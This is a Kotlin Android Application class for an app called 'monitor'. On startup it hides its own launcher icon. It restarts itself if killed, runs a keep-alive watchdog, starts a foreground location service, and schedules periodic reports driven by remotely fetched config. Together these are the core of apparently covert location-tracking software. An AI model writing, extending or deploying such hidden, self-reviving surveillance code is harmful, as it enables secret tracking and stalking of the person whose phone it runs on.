package com.monitor.app

import android.app.Application
import android.content.pm.PackageManager
import androidx.work.*
import com.monitor.app.config.ConfigManager
import com.monitor.app.diag.DiagnosticLogger
import com.monitor.app.keepalive.KeepAliveManager
import com.monitor.app.location.LocationService
import com.monitor.app.report.ReportWorker
import com.monitor.app.util.TimeRangeMatcher
import dagger.hilt.android.HiltAndroidApp
import java.time.LocalTime
import javax.inject.Inject

@HiltAndroidApp
class MonitorApplication : Application() {

    @Inject lateinit var configManager: ConfigManager
    @Inject lateinit var keepAliveManager: KeepAliveManager
    @Inject lateinit var diagnosticLogger: DiagnosticLogger

    override fun onCreate() {
        super.onCreate()

        // Hide launcher icon
        disableLauncherIcon()

        // Detect if previously killed
        val wasKilled = keepAliveManager.checkWasKilled()
        if (wasKilled) {
            diagnosticLogger.log("service_killed")
            keepAliveManager.restartIfKilled()
        }

        // Initialize config (loads cached, then async fetches remote)
        configManager.init()

        // Start foreground location service
        val intent = android.content.Intent(this, LocationService::class.java)
        startForegroundService(intent)

        // Schedule watchdog
        val config = configManager.getConfigBlocking()
        keepAliveManager.scheduleWatchdog(config.keep_alive.watchdog.check_interval_seconds)

        // Schedule report worker
        scheduleReportUpdate()

        // Schedule cleanup
        CleanupWorker.schedule(this)
    }

    private fun scheduleReportUpdate() {
        val now = LocalTime.now()
        val config = configManager.getConfigBlocking()
        val active = config.report.intervals.find { interval ->
            val range = TimeRangeMatcher.TimeRange(interval.start, interval.end)
            TimeRangeMatcher.isInRange(range, now)
        }
        val intervalSeconds = active?.interval_seconds ?: 3600
        ReportWorker.schedule(this, intervalSeconds)
    }

    private fun disableLauncherIcon() {
        val componentName = android.content.ComponentName(
            this, "com.monitor.app.ui.HiddenActivity"
        )
        packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }
}
